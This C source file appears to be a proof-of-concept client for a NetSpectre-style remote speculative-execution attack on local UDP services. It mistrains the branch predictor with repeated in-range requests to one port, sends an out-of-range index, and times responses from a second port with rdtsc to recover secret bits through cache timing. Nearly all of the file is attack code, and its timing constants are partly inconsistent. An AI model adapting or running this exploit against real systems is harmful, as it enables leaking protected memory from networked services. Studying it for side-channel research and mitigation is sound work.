#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h> //inet_addr
#include <sched.h>
#include <time.h>
#include <stdlib.h>




#define MAX(X,Y) (((X) > (Y)) ? (X) : (Y))
#define MIN(X,Y) (((X) < (Y)) ? (X) : (Y))

#define CACHE_MISS 2000
#define ARR_SIZE 1024
#define RECV_SIZE 3

#define CACHE_HIT_MIN 13729
#define CACHE_HIT_MAX  9035

#define REP 100000


uint16_t counter_hit[10][8] = {0};
uint16_t counter_miss[10][8] = {0};
double counter_average[10][8] = {0};

uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}


char recvline[RECV_SIZE];
int attack(int value,int sockfd,struct sockaddr_in free_socket,socklen_t slen)
{
  uint64_t start = 0, end = 0;      
  bzero(recvline,RECV_SIZE);

  //for (uint32_t channel_bit = 0; channel_bit < WORD_SIZE; channel_bit++) {
  //    uint8_t bit = readBit(addr + backchannel[channel_index][channel_bit]);
  //    byte |= (bit << channel_bit);
  //  }

  int send_val = htonl(value);
  if (sendto(sockfd,&send_val,sizeof(send_val),0,(struct sockaddr *) &free_socket, slen)==-1)
  {
    printf("sendto() socket2 failed");
  }

  start = rdtsc();
  if(recvfrom(sockfd,recvline,RECV_SIZE, 0, (struct sockaddr *) &free_socket, &slen) == -1)
  {
    printf("receive failed\n");
  }
  //  printf("%s\n",recvline);
  end = rdtsc();
  //printf("%lld\n",end - start);

  if(end - start < 13397)
  {
    return 1;
  }
  return 0;
}

void attack_byte(int byte_nr,socklen_t slen,struct sockaddr_in restricted_socket,
  struct sockaddr_in free_socket,struct sockaddr_in flush_socket,
  int sockfd,int sockfd2,int flush_fd)
{
   unsigned int send_val = 0;
   int j = 0,k = 0;

   uint64_t start = 0, end = 0;      
    
   int ind = 0;
   int val = 8 * byte_nr;
   int counter = 0;
   uint64_t delta = 0;

   int byte=0,bit=0;

   for(int rep = 0;rep < REP;rep++)
    {
        j = (j + 1) % 5;

        if(j == 4)
        {
          j = byte_nr;
          send_val = htonl(j);
          sendto(flush_fd, &send_val, sizeof(send_val), 0, (struct sockaddr*) &flush_socket, slen);
          recvfrom(flush_fd, &send_val, sizeof(send_val), 0, (struct sockaddr *) &flush_socket, &slen);
        }
      
        
        if(rep % 10000 == 0)
        {
          printf("%d\n",rep);
        }

        // mistrain
        for(k = (10 - j+1) * (10 - j+1); k > 0; k--) 
        { 
            //access_array(j);
            bzero(recvline,RECV_SIZE);
            send_val = htonl(8*j+ind);
            //write(sockfd,&send_val,sizeof(send_val));
            sendto(sockfd,&send_val,sizeof(send_val),0,(struct sockaddr *) &restricted_socket,slen);
            //only access
            recvfrom(sockfd,recvline,RECV_SIZE,0,(struct sockaddr *) &restricted_socket,&slen);
            ind = (ind+1) % 8;
            //ind = rand() % 8;
            //only relevant values
        }
        
        if(j >= 4) 
        { 
          for(int col = 0; col < 8; col++)
          {
            send_val = htonl(val);
            sendto(sockfd2,&send_val, sizeof(send_val),0,(struct sockaddr *) &free_socket, slen);

            start = rdtsc();
            recvfrom(sockfd2,recvline,RECV_SIZE, 0, (struct sockaddr *) &free_socket, &slen);
            end = rdtsc();
            //printf("%lld\n",end - start);
            delta = end - start;
            byte = val / 8;
            bit = val % 8;
            if(delta <= CACHE_HIT_MAX)
            {
              counter_hit[byte][(7-bit)]++;
            }
            else
            {
              counter_miss[byte][(7-bit)]++;
            }

            val = (8*byte_nr) + counter;
            counter = (counter + 1) % 8;
          }
        }
        sched_yield();
    }
}

int main(int argc,char **argv)
{
    int sockfd,sockfd2,flush_fd;
    struct sockaddr_in restricted_socket,free_socket,flush_socket;

    srand(time(NULL));
    socklen_t slen=sizeof(restricted_socket);
 
    if((sockfd=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) == -1)
    {
      printf("Socket 1 connection failed\n");
      perror("socket");
    }


    if((sockfd2=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP))== -1)
    {
      printf("Socket 2 connection failed\n");
    }

    if((flush_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
      printf("Socket 3 connection failed\n");
    }
    
      
    bzero(&flush_socket, sizeof(flush_socket));
    bzero(&restricted_socket, sizeof(restricted_socket));
    bzero(&free_socket, sizeof(free_socket));
    
    restricted_socket.sin_addr.s_addr = inet_addr("127.0.0.1");
    restricted_socket.sin_family=AF_INET;
    restricted_socket.sin_port=htons(5000);

    free_socket.sin_addr.s_addr = inet_addr("127.0.0.1");
    free_socket.sin_family=AF_INET;
    free_socket.sin_port=htons(6000);

    flush_socket.sin_addr.s_addr = inet_addr("127.0.0.1");
    flush_socket.sin_family=AF_INET;
    flush_socket.sin_port=htons(6001);
  

    for(int byte_nr = 4;byte_nr < 5;byte_nr++)
    {
      attack_byte(byte_nr,slen,restricted_socket,
      free_socket,flush_socket,
      sockfd,sockfd2,flush_fd);
    }

    int i=0,j=0;

    printf("Hits\n");
    for (i = 0; i < 10; i++)
    {
      for(j = 0; j < 8;j++)
      {
        printf("%d ",counter_hit[i][j]);
      }
      printf("\n");
    } 

    printf("Miss\n");
    for (i = 0; i < 10; i++)
    {
      for(j = 0; j < 8;j++)
      {
        printf("%d ",counter_miss[i][j]);
      }
      printf("\n");
    }

  return 0;
}

